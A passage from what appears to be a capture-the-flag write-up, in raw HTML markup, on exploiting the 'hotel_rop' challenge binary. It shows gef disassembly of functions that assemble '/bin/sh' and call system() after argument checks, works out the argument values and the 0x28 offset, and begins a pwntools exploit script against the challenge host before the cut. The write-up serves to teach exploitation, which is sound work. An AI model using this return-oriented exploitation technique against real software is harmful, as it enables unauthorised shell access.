</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000001236</span> <span class="err">&lt;+</span><span class="mi">90</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rip</span><span class="err">+</span><span class="mi">0x2e3c</span><span class="p">],</span><span class="no">eax</span>        <span class="c1"># 0x4078 &lt;len&gt;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>   <span class="err">0</span><span class="nf">x000000000000123c</span> <span class="err">&lt;+</span><span class="mi">96</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">eax</span><span class="p">,</span><span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rip</span><span class="err">+</span><span class="mi">0x2e36</span><span class="p">]</span>        <span class="c1"># 0x4078 &lt;len&gt;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>   <span class="err">0</span><span class="nf">x0000000000001242</span> <span class="err">&lt;+</span><span class="mi">102</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">cdqe</span>   
</span></span><span class="line"><span class="cl">   <span class="mi">0x0000000000001244</span> <span class="err">&lt;+</span><span class="mi">104</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">lea</span>    <span class="no">rdx</span><span class="p">,[</span><span class="no">rip</span><span class="err">+</span><span class="mi">0x2e25</span><span class="p">]</span>        <span class="c1"># 0x4070 &lt;win_land&gt;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>   <span class="err">0</span><span class="nf">x000000000000124b</span> <span class="err">&lt;+</span><span class="mi">111</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">BYTE</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rax</span><span class="err">+</span><span class="no">rdx</span><span class="p">*</span><span class="mi">1</span><span class="p">],</span><span class="mi">0x69</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x000000000000124f</span> <span class="err">&lt;+</span><span class="mi">115</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">eax</span><span class="p">,</span><span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rip</span><span class="err">+</span><span class="mi">0x2e23</span><span class="p">]</span>        <span class="c1"># 0x4078 &lt;len&gt;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>   <span class="err">0</span><span class="nf">x0000000000001255</span> <span class="err">&lt;+</span><span class="mi">121</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">add</span>    <span class="no">eax</span><span class="p">,</span><span class="mi">0x1</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000001258</span> <span class="err">&lt;+</span><span class="mi">124</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rip</span><span class="err">+</span><span class="mi">0x2e1a</span><span class="p">],</span><span class="no">eax</span>        <span class="c1"># 0x4078 &lt;len&gt;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>   <span class="err">0</span><span class="nf">x000000000000125e</span> <span class="err">&lt;+</span><span class="mi">130</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">eax</span><span class="p">,</span><span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rip</span><span class="err">+</span><span class="mi">0x2e14</span><span class="p">]</span>        <span class="c1"># 0x4078 &lt;len&gt;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>   <span class="err">0</span><span class="nf">x0000000000001264</span> <span class="err">&lt;+</span><span class="mi">136</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">cdqe</span>   
</span></span><span class="line"><span class="cl">   <span class="mi">0x0000000000001266</span> <span class="err">&lt;+</span><span class="mi">138</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">lea</span>    <span class="no">rdx</span><span class="p">,[</span><span class="no">rip</span><span class="err">+</span><span class="mi">0x2e03</span><span class="p">]</span>        <span class="c1"># 0x4070 &lt;win_land&gt;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>   <span class="err">0</span><span class="nf">x000000000000126d</span> <span class="err">&lt;+</span><span class="mi">145</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">BYTE</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rax</span><span class="err">+</span><span class="no">rdx</span><span class="p">*</span><span class="mi">1</span><span class="p">],</span><span class="mi">0x6e</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000001271</span> <span class="err">&lt;+</span><span class="mi">149</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">eax</span><span class="p">,</span><span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rip</span><span class="err">+</span><span class="mi">0x2e01</span><span class="p">]</span>        <span class="c1"># 0x4078 &lt;len&gt;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>   <span class="err">0</span><span class="nf">x0000000000001277</span> <span class="err">&lt;+</span><span class="mi">155</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">add</span>    <span class="no">eax</span><span class="p">,</span><span class="mi">0x1</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x000000000000127a</span> <span class="err">&lt;+</span><span class="mi">158</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rip</span><span class="err">+</span><span class="mi">0x2df8</span><span class="p">],</span><span class="no">eax</span>        <span class="c1"># 0x4078 &lt;len&gt;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>   <span class="err">0</span><span class="nf">x0000000000001280</span> <span class="err">&lt;+</span><span class="mi">164</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">nop</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000001281</span> <span class="err">&lt;+</span><span class="mi">165</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">pop</span>    <span class="no">rbp</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000001282</span> <span class="err">&lt;+</span><span class="mi">166</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">ret</span>    
</span></span><span class="line"><span class="cl"><span class="no">End</span> <span class="no">of</span> <span class="no">assembler</span> <span class="no">dump.</span>
</span></span><span class="line"><span class="cl"><span class="nf">gef</span><span class="err">➤</span>  <span class="no">disas</span> <span class="no">silicon_valley</span> 
</span></span><span class="line"><span class="cl"><span class="no">Dump</span> <span class="no">of</span> <span class="no">assembler</span> <span class="no">code</span> <span class="no">for</span> <span class="no">function</span> <span class="no">silicon_valley</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000001283</span> <span class="err">&lt;+</span><span class="mi">0</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">push</span>   <span class="no">rbp</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000001284</span> <span class="err">&lt;+</span><span class="mi">1</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">rbp</span><span class="p">,</span><span class="no">rsp</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000001287</span> <span class="err">&lt;+</span><span class="mi">4</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">lea</span>    <span class="no">rdi</span><span class="p">,[</span><span class="no">rip</span><span class="err">+</span><span class="mi">0xe25</span><span class="p">]</span>        <span class="c1"># 0x20b3
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>   <span class="err">0</span><span class="nf">x000000000000128e</span> <span class="err">&lt;+</span><span class="mi">11</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">call</span>   <span class="mh">0x1030</span> <span class="p">&lt;</span><span class="no">puts@plt</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000001293</span> <span class="err">&lt;+</span><span class="mi">16</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">eax</span><span class="p">,</span><span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rip</span><span class="err">+</span><span class="mi">0x2ddf</span><span class="p">]</span>        <span class="c1"># 0x4078 &lt;len&gt;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>   <span class="err">0</span><span class="nf">x0000000000001299</span> <span class="err">&lt;+</span><span class="mi">22</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">cdqe</span>   
</span></span><span class="line"><span class="cl">   <span class="mi">0x000000000000129b</span> <span class="err">&lt;+</span><span class="mi">24</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">lea</span>    <span class="no">rdx</span><span class="p">,[</span><span class="no">rip</span><span class="err">+</span><span class="mi">0x2dce</span><span class="p">]</span>        <span class="c1"># 0x4070 &lt;win_land&gt;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>   <span class="err">0</span><span class="nf">x00000000000012a2</span> <span class="err">&lt;+</span><span class="mi">31</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">BYTE</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rax</span><span class="err">+</span><span class="no">rdx</span><span class="p">*</span><span class="mi">1</span><span class="p">],</span><span class="mi">0x2f</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000000012a6</span> <span class="err">&lt;+</span><span class="mi">35</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">eax</span><span class="p">,</span><span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rip</span><span class="err">+</span><span class="mi">0x2dcc</span><span class="p">]</span>        <span class="c1"># 0x4078 &lt;len&gt;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>   <span class="err">0</span><span class="nf">x00000000000012ac</span> <span class="err">&lt;+</span><span class="mi">41</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">add</span>    <span class="no">eax</span><span class="p">,</span><span class="mi">0x1</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000000012af</span> <span class="err">&lt;+</span><span class="mi">44</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rip</span><span class="err">+</span><span class="mi">0x2dc3</span><span class="p">],</span><span class="no">eax</span>        <span class="c1"># 0x4078 &lt;len&gt;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>   <span class="err">0</span><span class="nf">x00000000000012b5</span> <span class="err">&lt;+</span><span class="mi">50</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">eax</span><span class="p">,</span><span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rip</span><span class="err">+</span><span class="mi">0x2dbd</span><span class="p">]</span>        <span class="c1"># 0x4078 &lt;len&gt;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>   <span class="err">0</span><span class="nf">x00000000000012bb</span> <span class="err">&lt;+</span><span class="mi">56</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">cdqe</span>   
</span></span><span class="line"><span class="cl">   <span class="mi">0x00000000000012bd</span> <span class="err">&lt;+</span><span class="mi">58</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">lea</span>    <span class="no">rdx</span><span class="p">,[</span><span class="no">rip</span><span class="err">+</span><span class="mi">0x2dac</span><span class="p">]</span>        <span class="c1"># 0x4070 &lt;win_land&gt;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>   <span class="err">0</span><span class="nf">x00000000000012c4</span> <span class="err">&lt;+</span><span class="mi">65</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">BYTE</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rax</span><span class="err">+</span><span class="no">rdx</span><span class="p">*</span><span class="mi">1</span><span class="p">],</span><span class="mi">0x73</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000000012c8</span> <span class="err">&lt;+</span><span class="mi">69</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">eax</span><span class="p">,</span><span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rip</span><span class="err">+</span><span class="mi">0x2daa</span><span class="p">]</span>        <span class="c1"># 0x4078 &lt;len&gt;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>   <span class="err">0</span><span class="nf">x00000000000012ce</span> <span class="err">&lt;+</span><span class="mi">75</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">add</span>    <span class="no">eax</span><span class="p">,</span><span class="mi">0x1</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000000012d1</span> <span class="err">&lt;+</span><span class="mi">78</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rip</span><span class="err">+</span><span class="mi">0x2da1</span><span class="p">],</span><span class="no">eax</span>        <span class="c1"># 0x4078 &lt;len&gt;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>   <span class="err">0</span><span class="nf">x00000000000012d7</span> <span class="err">&lt;+</span><span class="mi">84</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">eax</span><span class="p">,</span><span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rip</span><span class="err">+</span><span class="mi">0x2d9b</span><span class="p">]</span>        <span class="c1"># 0x4078 &lt;len&gt;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>   <span class="err">0</span><span class="nf">x00000000000012dd</span> <span class="err">&lt;+</span><span class="mi">90</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">cdqe</span>   
</span></span><span class="line"><span class="cl">   <span class="mi">0x00000000000012df</span> <span class="err">&lt;+</span><span class="mi">92</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">lea</span>    <span class="no">rdx</span><span class="p">,[</span><span class="no">rip</span><span class="err">+</span><span class="mi">0x2d8a</span><span class="p">]</span>        <span class="c1"># 0x4070 &lt;win_land&gt;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>   <span class="err">0</span><span class="nf">x00000000000012e6</span> <span class="err">&lt;+</span><span class="mi">99</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">BYTE</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rax</span><span class="err">+</span><span class="no">rdx</span><span class="p">*</span><span class="mi">1</span><span class="p">],</span><span class="mi">0x68</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000000012ea</span> <span class="err">&lt;+</span><span class="mi">103</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">eax</span><span class="p">,</span><span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rip</span><span class="err">+</span><span class="mi">0x2d88</span><span class="p">]</span>        <span class="c1"># 0x4078 &lt;len&gt;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>   <span class="err">0</span><span class="nf">x00000000000012f0</span> <span class="err">&lt;+</span><span class="mi">109</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">add</span>    <span class="no">eax</span><span class="p">,</span><span class="mi">0x1</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000000012f3</span> <span class="err">&lt;+</span><span class="mi">112</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rip</span><span class="err">+</span><span class="mi">0x2d7f</span><span class="p">],</span><span class="no">eax</span>        <span class="c1"># 0x4078 &lt;len&gt;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>   <span class="err">0</span><span class="nf">x00000000000012f9</span> <span class="err">&lt;+</span><span class="mi">118</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">eax</span><span class="p">,</span><span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rip</span><span class="err">+</span><span class="mi">0x2d79</span><span class="p">]</span>        <span class="c1"># 0x4078 &lt;len&gt;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>   <span class="err">0</span><span class="nf">x00000000000012ff</span> <span class="err">&lt;+</span><span class="mi">124</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">cdqe</span>   
</span></span><span class="line"><span class="cl">   <span class="mi">0x0000000000001301</span> <span class="err">&lt;+</span><span class="mi">126</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">lea</span>    <span class="no">rdx</span><span class="p">,[</span><span class="no">rip</span><span class="err">+</span><span class="mi">0x2d68</span><span class="p">]</span>        <span class="c1"># 0x4070 &lt;win_land&gt;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>   <span class="err">0</span><span class="nf">x0000000000001308</span> <span class="err">&lt;+</span><span class="mi">133</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">BYTE</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rax</span><span class="err">+</span><span class="no">rdx</span><span class="p">*</span><span class="mi">1</span><span class="p">],</span><span class="mi">0x0</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x000000000000130c</span> <span class="err">&lt;+</span><span class="mi">137</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">eax</span><span class="p">,</span><span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rip</span><span class="err">+</span><span class="mi">0x2d66</span><span class="p">]</span>        <span class="c1"># 0x4078 &lt;len&gt;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>   <span class="err">0</span><span class="nf">x0000000000001312</span> <span class="err">&lt;+</span><span class="mi">143</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">add</span>    <span class="no">eax</span><span class="p">,</span><span class="mi">0x1</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000001315</span> <span class="err">&lt;+</span><span class="mi">146</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rip</span><span class="err">+</span><span class="mi">0x2d5d</span><span class="p">],</span><span class="no">eax</span>        <span class="c1"># 0x4078 &lt;len&gt;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>   <span class="err">0</span><span class="nf">x000000000000131b</span> <span class="err">&lt;+</span><span class="mi">152</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">nop</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x000000000000131c</span> <span class="err">&lt;+</span><span class="mi">153</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">pop</span>    <span class="no">rbp</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x000000000000131d</span> <span class="err">&lt;+</span><span class="mi">154</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">ret</span>    
</span></span><span class="line"><span class="cl"><span class="no">End</span> <span class="no">of</span> <span class="no">assembler</span> <span class="no">dump.</span>
</span></span><span class="line"><span class="cl"><span class="nf">gef</span><span class="err">➤</span>  
</span></span></code></pre></div><p>The california function adds the 4 bytes to the win_land global variable, the 4 bytes were /bin and the next function named silicon_valley adds the remaining 4 bytes /sh\x00 to the win_land making the win_land equals to the /bin/shx00, then there was another function named loss, which was as following:-</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nf">gef</span><span class="err">➤</span>  <span class="no">disas</span> <span class="no">loss</span>
</span></span><span class="line"><span class="cl"><span class="nf">Dump</span> <span class="no">of</span> <span class="no">assembler</span> <span class="no">code</span> <span class="no">for</span> <span class="no">function</span> <span class="no">loss</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000001185</span> <span class="err">&lt;+</span><span class="mi">0</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">push</span>   <span class="no">rbp</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000001186</span> <span class="err">&lt;+</span><span class="mi">1</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">rbp</span><span class="p">,</span><span class="no">rsp</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000001189</span> <span class="err">&lt;+</span><span class="mi">4</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">sub</span>    <span class="no">rsp</span><span class="p">,</span><span class="mi">0x10</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x000000000000118d</span> <span class="err">&lt;+</span><span class="mi">8</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-0x4</span><span class="p">],</span><span class="no">edi</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000001190</span> <span class="err">&lt;+</span><span class="mi">11</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-0x8</span><span class="p">],</span><span class="no">esi</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000001193</span> <span class="err">&lt;+</span><span class="mi">14</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">edx</span><span class="p">,</span><span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-0x4</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000001196</span> <span class="err">&lt;+</span><span class="mi">17</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">eax</span><span class="p">,</span><span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-0x8</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000001199</span> <span class="err">&lt;+</span><span class="mi">20</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">add</span>    <span class="no">eax</span><span class="p">,</span><span class="no">edx</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x000000000000119b</span> <span class="err">&lt;+</span><span class="mi">22</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">cmp</span>    <span class="no">eax</span><span class="p">,</span><span class="mi">0xdeadc0de</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000000011a0</span> <span class="err">&lt;+</span><span class="mi">27</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">jne</span>    <span class="mh">0x11d9</span> <span class="p">&lt;</span><span class="no">loss</span><span class="p">+</span><span class="mi">84</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000000011a2</span> <span class="err">&lt;+</span><span class="mi">29</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">lea</span>    <span class="no">rdi</span><span class="p">,[</span><span class="no">rip</span><span class="err">+</span><span class="mi">0xe5f</span><span class="p">]</span>        <span class="c1"># 0x2008
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>   <span class="err">0</span><span class="nf">x00000000000011a9</span> <span class="err">&lt;+</span><span class="mi">36</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">call</span>   <span class="mh">0x1030</span> <span class="p">&lt;</span><span class="no">puts@plt</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000000011ae</span> <span class="err">&lt;+</span><span class="mi">41</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">cmp</span>    <span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-0x4</span><span class="p">],</span><span class="mi">0x1337c0de</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000000011b5</span> <span class="err">&lt;+</span><span class="mi">48</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">jne</span>    <span class="mh">0x11d9</span> <span class="p">&lt;</span><span class="no">loss</span><span class="p">+</span><span class="mi">84</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000000011b7</span> <span class="err">&lt;+</span><span class="mi">50</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">lea</span>    <span class="no">rdi</span><span class="p">,[</span><span class="no">rip</span><span class="err">+</span><span class="mi">0xe7a</span><span class="p">]</span>        <span class="c1"># 0x2038
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>   <span class="err">0</span><span class="nf">x00000000000011be</span> <span class="err">&lt;+</span><span class="mi">57</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">call</span>   <span class="mh">0x1030</span> <span class="p">&lt;</span><span class="no">puts@plt</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000000011c3</span> <span class="err">&lt;+</span><span class="mi">62</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">lea</span>    <span class="no">rdi</span><span class="p">,[</span><span class="no">rip</span><span class="err">+</span><span class="mi">0x2ea6</span><span class="p">]</span>        <span class="c1"># 0x4070 &lt;win_land&gt;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>   <span class="err">0</span><span class="nf">x00000000000011ca</span> <span class="err">&lt;+</span><span class="mi">69</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">call</span>   <span class="mh">0x1040</span> <span class="p">&lt;</span><span class="no">system@plt</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000000011cf</span> <span class="err">&lt;+</span><span class="mi">74</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">edi</span><span class="p">,</span><span class="mi">0x0</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000000011d4</span> <span class="err">&lt;+</span><span class="mi">79</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">call</span>   <span class="mh">0x1080</span> <span class="p">&lt;</span><span class="no">exit@plt</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000000011d9</span> <span class="err">&lt;+</span><span class="mi">84</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">nop</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000000011da</span> <span class="err">&lt;+</span><span class="mi">85</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">leave</span>  
</span></span><span class="line"><span class="cl">   <span class="mi">0x00000000000011db</span> <span class="err">&lt;+</span><span class="mi">86</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">ret</span>    
</span></span><span class="line"><span class="cl"><span class="no">End</span> <span class="no">of</span> <span class="no">assembler</span> <span class="no">dump.</span>
</span></span><span class="line"><span class="cl"><span class="nf">gef</span><span class="err">➤</span>  
</span></span></code></pre></div><p>There’s some twist to the loss function, first it expects 2 arguments from the function call then it checks if the sum of 1st and 2nd argument is equals to the 0xdeadc0de if it is, then check if the first argument is equal to the 0x1337c0de once it is, calls the system with the win_land as it’s argument. In order to exploit this, with the gef we find the offset which was 0x28. then we must call californiaand silicon_valley respectively to make the win_land variable equals to /bin/sh then call the loss function.</p>
<p>During the call of the loss function, since we know that it expects the 1st argument to be the 0x1337c0de and the sum of 1st and 2nd should be 0xdeadc0de, we can just find the right value for the second argument by subtracting the 0xdeadc0de from the 0x1337c0de which will be:-</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nf">gef</span><span class="err">➤</span>  <span class="no">p</span> <span class="mi">0xdeadc0de</span> <span class="p">-</span> <span class="mi">0x1337c0de</span>
</span></span><span class="line"><span class="cl"><span class="nf">$4</span> <span class="err">=</span> <span class="mi">0xcb760000</span>
</span></span><span class="line"><span class="cl"><span class="nf">gef</span><span class="err">➤</span>  
</span></span></code></pre></div><p>Now, the exploit will be:-</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span><span class="o">*</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&#34;dctf1-chall-hotel-rop.westeurope.azurecontainer.io&#34;</span><span class="p">,</span> <span class="mi">7480</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;hotel_rop&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;Welcome to Hotel ROP, on main street &#34;</span><span class="p">)</span>
